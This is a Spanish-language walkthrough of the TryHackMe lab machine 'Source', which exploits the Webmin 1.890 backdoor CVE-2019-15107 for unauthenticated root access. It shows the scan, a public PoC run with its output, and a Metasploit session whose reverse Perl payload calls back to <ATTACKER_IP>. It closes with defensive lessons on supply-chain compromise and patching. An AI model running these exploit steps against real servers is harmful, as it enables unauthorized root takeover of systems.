Source es una máquina Linux Easy de TryHackMe con una sola lección detrás, contada por sus propias flags: *actualiza tu instalación*, y *compromiso de la cadena de suministro*. La máquina corre **Webmin 1.890**, una versión que cae dentro del rango envenenado por el célebre backdoor de **CVE-2019-15107** — código malicioso que se coló en la build oficial de Webmin y se distribuyó a todo el que lo descargó. Como el vulnerable `password_change.cgi` corre dentro de un demonio de Webmin que a su vez corre como **root**, una sola petición no autenticada da una shell de root directamente. No hay escalada de privilegios; el foothold *es* root.

## Reconocimiento y Enumeración

### Escaneo de Puertos

Un escaneo TCP completo con detección de servicios y scripts por defecto. `-p-` cubre los 65.535 puertos, `-sCV` lanza los scripts NSE por defecto más la detección de versiones, y `-Pn` salta el descubrimiento de host.

```bash
sudo nmap -p- -sCV -Pn -n 10.128.159.82 -oN nmap
```

```bash
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
```

Solo dos servicios. SSH no tiene nada reseñable, así que todo apunta al puerto **10000** — **MiniServ 1.890**, el demonio HTTP detrás de **Webmin** (un panel de administración de sistemas por web).

Un detalle importante: nmap etiqueta el puerto 10000 como `http`, pero Webmin aquí solo responde por **HTTPS**. Navegar a `http://…:10000` falla; `https://…:10000` sirve la página de login (con un aviso de certificado autofirmado):

![La página de login de Webmin servida por HTTPS en el puerto 10000](/assets/img/THM/Source/cap1.png)

Aunque no nos hacen falta credenciales — la propia versión es la vulnerabilidad.

## Acceso Inicial — CVE-2019-15107 (RCE del Backdoor de Webmin) como `root`

**CVE-2019-15107** no es un bug ordinario — es un **backdoor**. En 2019 un atacante comprometió la infraestructura de build de Webmin e inyectó código malicioso en el código fuente que luego se empaquetó y distribuyó por los canales oficiales. Todas las releases desde la **1.882 hasta la 1.921** (la 1.890 incluida) lo llevaban. El backdoor vive en `password_change.cgi`: cuando la funcionalidad de "cambiar contraseña expirada" está activada, el parámetro de contraseña `old` se pasa a una shell sin sanitizar, así que un atacante **no autenticado** puede inyectar un comando simplemente enviando una petición POST manipulada — una **inyección de comandos** de manual alcanzable sin ningún login.

El [PoC de MuirlandOracle](https://github.com/MuirlandOracle/CVE-2019-15107) lo automatiza. Detecta el modo SSL por sí solo, confirma que la versión es vulnerable, y cae en una pseudoshell:

```bash
python3 CVE-2019-15107.py 10.128.159.82
```

```bash
[*] Server is running in SSL mode. Switching to HTTPS
[+] Connected to https://10.128.159.82:10000/ successfully.
[+] Server version (1.890) should be vulnerable!
[+] Benign Payload executed!
[+] The target is vulnerable and a pseudoshell has been obtained.

# whoami
root
```

Eso es **root** de inmediato — ambas flags son legibles desde la misma shell, sin más pasos:

```bash
# cat /root/root.txt
REDACTED
# cat /home/dark/user.txt
REDACTED
```

### Por qué el foothold ya es root

Que una sola petición no autenticada nos deje como root merece entenderse en vez de solo aceptarse. La inyección de comandos se ejecuta con los privilegios del proceso que maneja la petición — y ese proceso es el demonio de Webmin:

```bash
# ps -aux | grep miniserv
root  1231  /usr/bin/perl /usr/share/webmin/miniserv.pl /etc/webmin/miniserv.conf
```

`miniserv.pl` corre como **root** (algo que Webmin necesita para administrar todo el sistema). Así que cualquier código inyectado a través de él hereda root, y simplemente no hay un usuario de menos privilegios desde el que escalar. La lección es la otra cara del mínimo privilegio: un servicio que tiene que correr como root convierte *cualquier* RCE en él en un compromiso total.

### Lo mismo en Metasploit

Metasploit trae el exploit idéntico, útil para confirmar el hallazgo o integrarlo en un engagement más amplio:

```bash
msf > use exploit/linux/http/webmin_backdoor
msf exploit(linux/http/webmin_backdoor) > set RHOSTS 10.128.159.82
msf exploit(linux/http/webmin_backdoor) > set LHOST <ATTACKER_IP>
msf exploit(linux/http/webmin_backdoor) > exploit
```

Los valores por defecto del módulo ya encajan con este objetivo — `RPORT 10000`, y crucialmente `SSL true` (sin lo cual intentaría HTTP plano y fallaría), con un payload `cmd/unix/reverse_perl`. Ejecuta su propia comprobación de vulnerabilidad, dispara el backdoor y devuelve una shell de root:

```bash
[+] The target is vulnerable.
[*] Sending cmd/unix/reverse_perl command payload
[*] Command shell session 2 opened (<ATTACKER_IP>:4444 -> 10.128.159.82:39230)

whoami
root
```

## Conclusiones Clave

- **El compromiso de la cadena de suministro es toda la historia.** CVE-2019-15107 no fue un error de programación de Webmin — fue código malicioso inyectado en su pipeline de build y distribuido como una release de confianza. Puedes seguir todas las prácticas de desarrollo seguro y aun así distribuir un backdoor si aquello *desde lo que construyes* está comprometido. Verificar checksums/firmas de lo que instalas, y estar atento a las actualizaciones tras una divulgación, es la defensa.
- **"http" en un resultado de nmap es una suposición, no una garantía.** El puerto 10000 solo respondía por HTTPS; asumir HTTP plano habría estancado toda la máquina en el primer paso. Cuando un servicio se comporta raro, prueba el otro esquema (y recuerda el `SSL true` de Metasploit).
- **Un servicio corriendo como root hace crítico cualquier bug.** El `miniserv.pl` de Webmin corre como root por diseño, así que la inyección de comandos saltó directa al máximo privilegio sin escalada. Donde un demonio necesita root de verdad, ahí es exactamente donde más importan la disciplina de parcheo y el aislamiento de red.
- **Mantén las interfaces de administración fuera de la red abierta.** Webmin en el 10000 era accesible directamente. Los paneles de administración van detrás de una VPN o de una allow-list, no expuestos a cualquiera que pueda alcanzar el host — así un simple n-day no puede convertirse en root instantáneo.
